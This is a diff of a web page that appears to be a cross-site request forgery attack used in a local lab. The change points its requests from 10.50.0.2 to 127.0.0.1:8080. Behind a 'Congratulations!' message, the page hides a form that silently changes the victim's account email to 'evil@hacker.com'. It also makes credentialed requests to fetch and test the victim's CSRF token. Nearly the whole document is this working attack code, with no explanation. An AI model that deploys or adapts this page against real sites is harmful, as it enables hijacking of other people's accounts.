@@ -17,7 +17,7 @@
 
         /*$.ajax({
             type: "POST",
-               url: "http://10.50.0.2/changeemail",
+               url: "http://127.0.0.1:8080/changeemail",
                data: $('#changeemailform').serialize(), // serializes the form's elements.
             xhrFields: {
                   withCredentials: true
@@ -32,7 +32,7 @@
     function getcsrftoken() {
         $.ajax({
             type: "GET",
-               url: "http://10.50.0.2/getcsrftoken",
+               url: "http://127.0.0.1:8080/getcsrftoken",
             xhrFields: {
                  withCredentials: true
             },
@@ -46,7 +46,7 @@
     function testcsrftoken(token) {
         $.ajax({
             type: "POST",
-               url: "http://10.50.0.2/testcsrftoken",
+               url: "http://127.0.0.1:8080/testcsrftoken",
             xhrFields: {
                  withCredentials: true
             },
@@ -69,7 +69,7 @@
             <h2>Congratulations!</h2>
 
             <div style="display: none;">
-            <form id="changeemailform" method="POST" action="http://10.50.0.2/changeemail">
+            <form id="changeemailform" method="POST" action="http://127.0.0.1:8080/changeemail">
                 <input type="hidden" name="old_email" id="old_email" value="" />
                 <input type="hidden" name="new_email" id="new_email" value="evil@hacker.com" />
                 <input type="hidden" name="confirm_email" id="confirm_email" value="evil@hacker.com" />
